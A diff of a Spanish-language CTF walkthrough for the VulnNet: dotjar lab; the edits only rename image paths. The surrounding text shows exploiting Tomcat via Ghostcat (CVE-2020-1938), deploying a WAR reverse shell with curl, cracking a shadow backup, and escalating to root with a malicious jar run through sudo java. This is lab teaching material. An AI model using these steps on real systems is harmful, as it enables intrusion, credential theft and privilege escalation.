@@ -13,11 +13,11 @@ nmap -sV -sC -p- -T4 <ip>
 
 Se han identificado cuatro puertos abiertos en el sistema: el puerto `22` para `SSH`, el `8009` para `ajp13`, el `8080`, para `HTTP` 
 
-<figure><img src="../.gitbook/assets/VulnNet: dotjar/nmap.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/VulnNet_dotjar/nmap.png" alt=""><figcaption></figcaption></figure>
 
 Al enumerar las páginas, no encontramos nada interesante; solo se abre la página de `Tomcat`. Sin embargo, aquí hay un dato relevante: la versión que está ejecutando es `Apache Tomcat/9.0.30`. Al buscar en internet, descubrimos que existe un exploit para esta versión.
 
-<figure><img src="../.gitbook/assets/VulnNet: dotjar/tomcat.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/VulnNet_dotjar/tomcat.png" alt=""><figcaption></figcaption></figure>
 
 El siguiente enlace nos proporciona una introducción sobre cómo funciona el exploit. Podemos optar por clonar el repositorio o simplemente descargar el archivo `.py`.
 
@@ -31,7 +31,7 @@ python CVE-2020-1938.py <IP address> -p 8009 -f WEB-INF/web.xml
 
 Esto nos proporciona unas credenciales que nos permiten iniciar sesión en `Tomcat`.
 
-<figure><img src="../.gitbook/assets/VulnNet: dotjar/creds.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/VulnNet_dotjar/creds.png" alt=""><figcaption></figcaption></figure>
 
 Aunque no contamos con una interfaz gráfica para acceder directamente a la página web, podemos hacerlo desde la terminal utilizando `curl`. Aquí realizaremos un despliegue en la página web para obtener nuestra `reverse shell` en el servidor.
 
@@ -49,7 +49,7 @@ curl -u webdev -T shell.war 'http://10.201.15.169:8080/manager/text/deploy?path=
 
 Se nos pedirá la contraseña que encontramos anteriormente, y recibiremos un mensaje indicando que se ejecutó con éxito.
 
-<figure><img src="../.gitbook/assets/VulnNet: dotjar/upda.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/VulnNet_dotjar/upda.png" alt=""><figcaption></figcaption></figure>
 
 Realizamos una solicitud a la dirección donde colocamos nuestra `reverse shell`, que es la siguiente:
 
@@ -59,13 +59,13 @@ http://<ip>:8080/shell.war
 
 Y obtenemos una shell que nos ayudará a elevar nuestros privilegios.
 
-<figure><img src="../.gitbook/assets/VulnNet: dotjar/curklq.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/VulnNet_dotjar/curklq.png" alt=""><figcaption></figcaption></figure>
 
 # \web
 
 Después de la enumeración, identificamos un vector que nos permite leer una copia de seguridad ubicada en `/var/backup`, específicamente el archivo `shadow-backup-alt.gz`.
 
-<figure><img src="../.gitbook/assets/VulnNet: dotjar/backjup.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/VulnNet_dotjar/backjup.png" alt=""><figcaption></figcaption></figure>
 
 Lo copiamos al directorio `/tmp` para poder extraer la informacion:
 
@@ -77,7 +77,7 @@ cd /tmp
 gunzip shadow-backup-alt.gz
 ```
 
-<figure><img src="../.gitbook/assets/VulnNet: dotjar/hsadow.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/VulnNet_dotjar/hsadow.png" alt=""><figcaption></figcaption></figure>
 
 Leemos el archivo y confirmamos que contiene lo que esperábamos: un archivo con las copias de seguridad de los `shadows` de los `usuarios`. Lo copiamos a nuestra máquina para poder descifrar la contraseña de `jdk-admin`.
 
@@ -85,13 +85,13 @@ Leemos el archivo y confirmamos que contiene lo que esperábamos: un archivo con
 jonh --wordlist /usr/share/wordlist/rockyou.txt hash
 ```
 
-<figure><img src="../.gitbook/assets/VulnNet: dotjar/uncripshadow.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/VulnNet_dotjar/uncripshadow.png" alt=""><figcaption></figcaption></figure>
 
 # \jdk-admin
 
 De esta manera, obtenemos acceso `SSH` para el usuario `jdk-admin`, así como el archivo `user.txt`.
 
-<figure><img src="../.gitbook/assets/VulnNet: dotjar/user.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/VulnNet_dotjar/user.png" alt=""><figcaption></figcaption></figure>
 
 Realizamos una enumeración con `linpeas.sh`. Tenemos varios ataques que podemos desarrollar, pero podemos suponer que está relacionado con `Java`, ya que se menciona al iniciar el laboratorio. Con el usuario y la contraseña de `jdk-admin`, podemos ejecutar el siguiente comando:
 
@@ -99,7 +99,7 @@ Realizamos una enumeración con `linpeas.sh`. Tenemos varios ataques que podemos
 sudo -l
 ```
 
-<figure><img src="../.gitbook/assets/VulnNet: dotjar/sudo-l.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/VulnNet_dotjar/sudo-l.png" alt=""><figcaption></figcaption></figure>
 
 Esto indica que podemos ejecutar cualquier archivo `.jar` con el usuario `root`, lo que nos permite implantar otra `reverse shell` para obtener los permisos de `root`.
 
@@ -157,7 +157,7 @@ Main-Class: shell
 
 Te quedara un archivo `shell.class`
 
-<figure><img src="../.gitbook/assets/VulnNet: dotjar/class.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/VulnNet_dotjar/class.png" alt=""><figcaption></figcaption></figure>
 
 1. Con todos los archivos anteriores ya podemos crear nuestro archivo `.jar`
 
@@ -165,7 +165,7 @@ Te quedara un archivo `shell.class`
 jar cfm shell.jar MANIFEST.MF shell.class
 ```
 
-<figure><img src="../.gitbook/assets/VulnNet: dotjar/jar.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/VulnNet_dotjar/jar.png" alt=""><figcaption></figcaption></figure>
 
 Solo quería descargar nuestro archivo `.jar` en los archivos del sistema de la víctima, y puedes hacerlo utilizando `Python`.
 
@@ -192,7 +192,7 @@ Maquina Victima:
 sudo -u root /usr/bin/java -jar shell.jar
 ```
 
-<figure><img src="../.gitbook/assets/VulnNet: dotjar/root.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/VulnNet_dotjar/root.png" alt=""><figcaption></figcaption></figure>
 
 -------------
 
@@ -200,4 +200,4 @@ sudo -u root /usr/bin/java -jar shell.jar
 >
 >*Con esto quiero enfatizar que el miedo a equivocarse es más paralizante que el error en sí. El error puede enseñarnos y abrir nuevos caminos, mientras que el miedo constante al fracaso nos detiene y nos impide vivir plenamente. El verdadero coraje no es la ausencia de miedo, sino la decisión de actuar a pesar de él.*
 >
-><figure><img src="../.gitbook/assets/VulnNet: dotjar/touthou.png" alt=""><figcaption></figcaption></figure>
+><figure><img src="../.gitbook/assets/VulnNet_dotjar/touthou.png" alt=""><figcaption></figcaption></figure>
